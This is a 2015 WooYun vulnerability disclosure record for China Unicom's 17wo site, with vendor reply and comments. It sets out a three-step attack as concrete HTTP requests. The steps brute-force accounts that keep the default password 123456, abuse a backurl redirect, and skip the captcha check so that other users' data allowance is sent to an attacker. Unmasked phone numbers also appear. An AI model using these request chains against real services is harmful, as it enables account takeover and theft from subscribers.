{"id": 73297, "wybug_id": "wooyun-2015-0153639", "wybug_title": "中国联通17wo设计缺陷可批量自动化盗取他人流量（三个请求轻松搞定）", "wybug_corp": "中国联通", "wybug_author": "北京方便面", "wybug_date": "2015-11-11 18:46", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 中国联通17wo设计缺陷可批量自动化盗取他人流量（三个请求轻松搞定） 详细说明：  17wo可以向他人发送流量红包【随机派发】那里前面验证了验证码，但是在最后一步却没验证，可以构造数据直接提交（需要登陆）。\nhttp://**.**.**.**/FlowRedPacket!sendFlowRedPacket.actiondata：packetAmount=1&sendFlowValue=1&mobile=18600815823&captcha_sj=123456\nsendFlowValue为赠送流量数，单位M。mobile=填写目标手机号然后发现用户注册后密码默认为：123456，可以批量爆破。经过测试构造可以构造两个请求达到批量盗取流量的效果：第一步：\nhttp://**.**.**.**/Login!process.action?mobile=18600815823&backurl=FlowRedPacket.action&password=123456&chk=&loginType=0&chkType=on\n可以利用burp直接爆破并利用backurl跳转获取当前手机号流量\n\n第二步：\nhttp://**.**.**.**/Login!process.action?mobile=18600815823&backurl=FlowRedPacket!sendFlowRedPacket.action?packetAmount%3d1%26sendFlowValue%3d1%26mobile%3d18600827452%26captcha_sj%3d123456&password=123456&chk=&loginType=0&chkType=on\nburp将第一步获取到的有流量的手机号作为第二步的目标手机号，将第一步获取到的流量值作为红包流量值（sendFlowValue）并抓取红包链接（例如：http://t.**.**.**.**/cu0afe），还是利用到了backurl\n\n第三步：带着你自己手机号登陆后的cookie批量去访问红包链接。\nhttp://t.**.**.**.**/xCT7dhhttp://t.**.**.**.**/qHDsvbhttp://t.**.**.**.**/dj7Z2mhttp://t.**.**.**.**/bxByy0http://t.**.**.**.**/ZELNPshttp://t.**.**.**.**/Uo1PKShttp://t.**.**.**.**/QFHJqPhttp://t.**.**.**.**/QCwmofhttp://t.**.**.**.**/Q5BGfAhttp://t.**.**.**.**/Q0QwZdhttp://t.**.**.**.**/Pcl18rhttp://t.**.**.**.**/NC2RVdhttp://t.**.**.**.**/KNxPLWhttp://t.**.**.**.**/KLUVwDhttp://t.**.**.**.**/HekWzzhttp://t.**.**.**.**/G0Qjqchttp://t.**.**.**.**/9OV0Mwhttp://t.**.**.**.**/83RNLihttp://t.**.**.**.**/5XV5vThttp://t.**.**.**.**/2F8kqZ\n自动化访问就不演示了，这里我们访问一个测试下：\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 北京方便面@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-23 10:47 厂商回复： CNVD未直接复现所述情况,已经转由CNCERT向中国联合网络通信集团有限公司通报,由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-11 19:26 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:720 漏洞数:108        | ®高级安全工程师 | WooYun认证√)\t\t \n  话说北京方便面里只有一包调料……    \n     2015-11-11 21:48 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:29        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  可恶！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}